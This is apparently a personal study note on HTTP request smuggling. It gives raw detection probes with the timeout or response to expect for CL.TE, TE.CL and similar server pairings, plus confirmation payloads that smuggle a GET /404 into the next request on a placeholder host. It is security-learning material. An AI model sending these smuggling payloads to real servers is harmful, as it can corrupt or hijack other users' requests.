1
![[Z Assets/Images/Pasted image 20260112184625.jpeg]]

## Detection
```http
POST / HTTP/1.1
content-length: 6
Transfer-encoding: chunked
/r/n
3/r/n
abc/r/n
X/r/n
```
- TE.TE: timeout/reject, Front-end expect `0` to end the request but it can't find it, so it hult.
- TE.CL: timeout/reject, Front-end expect `0` to end the request but it can't find it, so it hult.
- CL.CL: response, both of front/back-end accepts request `3\r\n abc`. The rest will be ignored.
- CL.TE: timeout, front end accept request `3\r\n abc`, but back-end use TE and expect `0` at the end but it can't find it so it hult

```http
POST / HTTP/1.1
content-length: 6
Transfer-encoding: chunked
/r/n
0/r/n
/r/n
X/r/n
```
- TE.TE: response, Both back/front-end see message until 0 then cut anything after that "Normal Request"
- TE.CL: timeOut, front-end accept request`0\r\n \r\n` and cut anything else, back-end use CL and because the front-end has cut the message, the message will be smaller than CL.
- CL.CL: response, both of them accept message untill X. "Normal Request"
- CL.TE: response (VULN). Front-end accept the whole request, but back-end accepts only `0\r\n \r\n` the reminder will be smuggled to next request

```http
POST / HTTP/1.1
content-length: 6
Transfer-encoding: chunked
/r/n
3/r/n
abc/r/n
0/r/n
```
- TE.TE: response.
- TE.CL: response.
- CL.CL: response.
- CL.TE: TimeOut.

### Best Practice
- Use the first payload, because if you used the second one and there was CL.TE vuln, that will disrupt other application users.
---
## Confirmation
### CL.TE
```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

### TE.CL
```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```